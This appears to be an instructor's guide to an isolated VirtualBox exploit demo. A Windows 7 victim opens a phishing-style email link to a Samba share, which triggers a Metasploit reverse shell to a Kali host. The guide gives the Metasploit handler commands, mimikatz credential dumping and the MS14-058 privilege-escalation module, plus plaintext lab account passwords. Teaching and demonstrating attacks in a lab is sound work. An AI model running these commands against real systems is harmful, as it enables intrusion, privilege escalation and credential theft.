Anatomy of an Exploit Demo Installation
=======================================

The demo should run under any modern version of VirtualBox.

it runs under a private network (192.168.100.x called "internal" ) separate from the normal VBox network by "pfsense". 
pfsense acts as a DHCP server giving out fixed IP addresses for the fileserver (ubuws - 192.168.100.122) and
the exploit server (kali32 - 192.168.100.150). The machine that will get exploited (Windows 7) does not need a 
fixed IP address, but needs to be in the network of 192.168.100.x.

The windows user need to browse to 192.168.100.122/share (a SAMBA mount) which will serve an exploit that connects 
back to 192.168.100.150 - the exploit is pre configured for those IPs and needs no furtehr configuration.
A Metasploit shell will give access to the windows machine and an exploit for MS14-058 can
be used to gain admin access if necessary.

There a number of warnings tha VBox and WIndows throw. Memory, Screens etc, these can usually be just closed and ignored.


1. Import OVA files - import all MAC addresses
- pfsense is in GitHub; others are in Onedrive
- pfsense - user: admin/pfsense
  - has a webinterface on 192.168.100.1
- ubuws - MAC ending: C86B - user: qscanner/qscanner has sudo
- windows7 - user: wkandek/coolmints0 admin/coke0500ml scanner/scanner
- kali32 - MAC ending: BFFO - user: root/qscanner


2. Check if networking work
- Windows 7 should be able to browse the Internet
- ifconfig on "ubuws" should give an IP address of 192.168.100.122
  - if the MAC address changed, networking might not be working - take a look at /etc/udev/rules.d/70-persistent-net.rules 
- ifconfig on kali32 should give an IP of 192.168.100.150

3. Run the demo
- pfsense and ubuws should be running - both components are stable and static  and need no interaction
- restart windows7
  - login admin, logout
- login kali32 root/qscanner
  - start Metasploit and prepare to open a shell to windows when windows browses to 192.168.100.122/share
    - Applications/08 Exploitation Tools/Metasploit...
	  done when a prompt shows up: msf5>
    - use exploit/multi/handler
	  set LPORT 443
	  set LHOST 192.168.100.150
	  exploit
    - wait for message [*} Started reverse TCP handler...	  
	- there is a file in /root/exploit.txt that has the instructions for cut-and-paste
- on windows7 
  - login wkandek
  - access 192.168.100.122/share via File Explorer or via OE E-mail client
    - OE Classic: connected to target@kandek.com and active
	  ignore update offer, ignore login problem; locate message Subject: Latest competitive Info on VM 
	  and click on link (Top 3 Info)
  - if you do not want to use this e-mail, you can setup your own e-mail and send a similar message to it.
- on Windows 7 there should be a crash
- on Kali32 there should be a message that a shell has been opened
  - Sending stage (179779 bytes) to 192.168.100.101
  - Meterpreter session 1 opened....
  - make note of the sesssion number will get use afterwards, typically is 1
  - try getuid and sysinfo commands
  - load mimikatz then kerberos fails in a more impressive way than the newer loal kiwi then creds_all

  - now become admin
    - exit out of the shell (via background command), select a new local exploit set the corretc session (typically 1) and run 
    - background  
	  use exploit/windows/local/ms14_058_track_popup_menu
	  set session 1
	  set LPORT 80
	  set LHOST 192.168.100.150
	  exploit
	
1tfML7DJbrcI
	
	  
  
  
  
  
  

  
	
  




